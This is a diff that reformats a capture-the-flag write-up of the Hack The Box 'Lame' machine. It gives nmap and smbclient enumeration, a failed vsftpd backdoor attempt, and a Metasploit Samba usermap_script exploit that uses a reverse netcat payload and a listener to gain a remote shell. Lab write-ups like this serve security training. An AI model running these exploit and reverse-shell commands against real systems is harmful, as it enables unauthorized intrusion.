@@ -1,84 +1,123 @@
-# Hack The Box - Lame
+# HTB - Lame
 
-IP Address: 10.10.10.3  
+IP: 10.10.10.3  
 Difficulty: Easy  
-Categories: FTP, SMB  
-Tools Used: Nmap, smbclient, Metasploit, Netcat, Python
+Tags: FTP, Samba, Reverse Shell
 
-## Enumeration
+---
 
-1. Basic Nmap Scan:
+## Nmap Scan & Service Enumeration
+
+Started with a basic nmap scan:
+
+```bash
 nmap 10.10.10.3
+```
 
-2. FTP Version Detection:
-nmap -sV -p 21 10.10.10.3  
-Result: vsftpd 2.3.4 (known vulnerable)
+Then checked the version of the FTP service:
 
-## Exploiting FTP (vsftpd 2.3.4)
+```bash
+nmap -sV -p 21 10.10.10.3
+```
 
-Launch Metasploit:
+Found: `vsftpd 2.3.4`, which is a known vulnerable version.
+
+---
+
+## Trying vsftpd 2.3.4 Exploit
+
+I used Metasploit to attempt the exploit:
+
+```bash
 msfconsole
-
-Use exploit:
-use exploit/unix/ftp/vsftpd_234_backdoor  
-set RHOSTS 10.10.10.3  
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 10.10.10.3
 run
+```
 
-Result: Exploit unsuccessful, no shell opened.
+Unfortunately, this didn't result in a shell. So I moved on to checking SMB.
 
-## SMB Enumeration
+---
 
-Scan SMB ports:
+## SMB Version Check
+
+Scanned the SMB ports:
+
+```bash
 nmap -sV -p 139,445 10.10.10.3
+```
 
-Check SMB shares:
-smbclient -L 10.10.10.3 -N  
-Result: Found Samba version 3.0.20
+The version wasn't clear, so I used smbclient:
 
-## Exploiting Samba 3.0.20 (CVE-2007-2447)
+```bash
+smbclient -L 10.10.10.3 -N
+```
 
-Launch Metasploit:
+This revealed that the target is running **Samba 3.0.20**, which is vulnerable to the `usermap_script` exploit.
+
+---
+
+## Exploiting Samba 3.0.20
+
+Back to Metasploit:
+
+```bash
 msfconsole
-
-Use Samba exploit:
-use exploit/multi/samba/usermap_script  
-set RHOSTS 10.10.10.3  
-set RPORT 139  
-set LHOST 10.10.14.106   # Replace with your VPN IP  
-set LPORT 4444  
-set PAYLOAD cmd/unix/reverse_netcat  
+use exploit/multi/samba/usermap_script
+set RHOSTS 10.10.10.3
+set RPORT 139
+set LHOST 10.10.14.106     # replace with your tun0 IP
+set LPORT 4444
+set PAYLOAD cmd/unix/reverse_netcat
 run
+```
 
-In a new terminal, start Netcat listener:
+Before running the above, I started a Netcat listener in another terminal:
+
+```bash
 nc -lvnp 4444
+```
 
-Result: [*] Command shell session 1 opened
+After executing the exploit, Metasploit didn’t show a session, but my Netcat listener caught a shell:
 
-## Upgrade to Full TTY (Optional)
+```
+[*] Command shell session 1 opened
+```
 
-If you want a stable shell:
+---
+
+## Upgrading the Shell (Optional)
+
+To get a more usable shell:
+
+```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
+```
 
-## Summary
+If Python 2 isn't available:
 
-Service: FTP  
-Port: 21  
-Version: vsftpd 2.3.4  
-Exploit: exploit/unix/ftp/vsftpd_234_backdoor  
-Result: ❌ Failed
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
 
-Service: SMB  
-Port: 139  
-Version: Samba 3.0.20  
-Exploit: exploit/multi/samba/usermap_script  
-Result: ✅ Success
+---
+
+## Summary Table
+
+| Service | Port | Version     | Exploit Module                             | Result     |
+|---------|------|-------------|--------------------------------------------|------------|
+| FTP     | 21   | vsftpd 2.3.4| exploit/unix/ftp/vsftpd_234_backdoor       | ❌ Failed  |
+| SMB     | 139  | Samba 3.0.20| exploit/multi/samba/usermap_script         | ✅ Success |
+
+---
 
 ## Final Notes
 
-- Even if Metasploit doesn’t show a shell, check your Netcat listener.
-- Use smbclient when Nmap doesn’t reveal full SMB details.
-- Always upgrade your shell to TTY for better usability.
-- Replace LHOST with your actual tun0 IP before running reverse shell exploits.
+- The FTP backdoor exploit didn’t work, but it was worth a try.
+- smbclient was helpful for identifying the vulnerable Samba version.
+- Listener is important — Metasploit may not show an open session.
+- Upgrading to a proper shell using Python makes interaction easier.
+
 
 Author: Srikanth A  
 Platform: Hack The Box  
